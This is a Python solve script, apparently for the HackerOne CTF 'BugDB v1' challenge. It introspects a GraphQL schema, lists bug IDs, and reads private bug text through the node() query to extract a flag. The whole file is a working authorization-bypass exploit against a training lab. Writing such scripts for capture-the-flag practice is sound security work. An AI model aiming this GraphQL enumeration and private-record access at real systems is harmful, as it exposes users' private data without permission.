#!/usr/bin/env python3
"""
PoC: BugDB v1 (HackerOne CTF)
Exploits GraphQL node() query to access private bug text containing the flag.

Usage: python3 solve.py <ctf_url>
"""

import sys
import json
import requests

FLAG_PATTERN = "^FLAG^"


def introspect_schema(base_url):
    """Query GraphQL introspection to discover the schema."""
    url = base_url.rstrip("/") + "/graphql"
    query = """
    {
        __schema {
            queryType { name }
            types { name kind fields { name type { name kind ofType { name kind } } args { name type { name kind } } } }
        }
    }
    """
    resp = requests.post(url, json={"query": query}, timeout=15)
    resp.raise_for_status()
    return resp.json()


def get_all_bugs(base_url):
    """Get all bug IDs via the allBugs query."""
    url = base_url.rstrip("/") + "/graphql"
    query = "{ allBugs { edges { node { id private } } } }"
    resp = requests.post(url, json={"query": query}, timeout=15)
    resp.raise_for_status()
    data = resp.json()
    bugs = []
    for edge in data["data"]["allBugs"]["edges"]:
        bugs.append(edge["node"])
    return bugs


def get_bug_text(base_url, bug_id):
    """Get the full bug text via the node() query which resolves to Bugs_ type."""
    url = base_url.rstrip("/") + "/graphql"
    query = """
    query GetBug($id: ID!) {
        node(id: $id) {
            id
            __typename
            ... on Bugs_ {
                text
                private
                reporter { username }
            }
        }
    }
    """
    resp = requests.post(
        url, json={"query": query, "variables": {"id": bug_id}}, timeout=15
    )
    resp.raise_for_status()
    data = resp.json()
    return data["data"]["node"]


def extract_flag(text):
    """Extract flag hex from a string containing ^FLAG^...$FLAG$."""
    if FLAG_PATTERN in text:
        start = text.index(FLAG_PATTERN) + len(FLAG_PATTERN)
        end = text.index("$FLAG$", start)
        return text[start:end]
    return None


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <ctf_base_url>")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")
    print(f"[*] Target: {base_url}")
    print()

    # Step 1: Enumerate all bugs
    print("[*] Enumerating bugs via allBugs query...")
    try:
        bugs = get_all_bugs(base_url)
        print(f"[+] Found {len(bugs)} bug(s):")
        for b in bugs:
            print(f"    ID: {b['id']}  private: {b['private']}")
    except Exception as e:
        print(f"[-] Failed to enumerate bugs: {e}")
        sys.exit(1)

    # Step 2: Access each bug via node() query to get text
    print()
    print("[*] Accessing bug text via node() query...")
    flags = []

    for b in bugs:
        bug_id = b["id"]
        private = b["private"]
        try:
            detail = get_bug_text(base_url, bug_id)
            text = detail.get("text", "")
            reporter = detail.get("reporter", {}).get("username", "unknown")
            print(f"[+] Bug {bug_id}: reporter={reporter} private={private}")
            print(f"    Text: {text[:80]}{'...' if len(text) > 80 else ''}")

            flag = extract_flag(text)
            if flag:
                flags.append(flag)
                print(f"    [***] FLAG FOUND: {flag}")
        except Exception as e:
            print(f"[-] Failed to get bug {bug_id}: {e}")

    # Summary
    print()
    if flags:
        for i, flag in enumerate(flags):
            print(f"[+] Flag {i}: {flag}")
    else:
        print("[-] No flags found.")


if __name__ == "__main__":
    main()
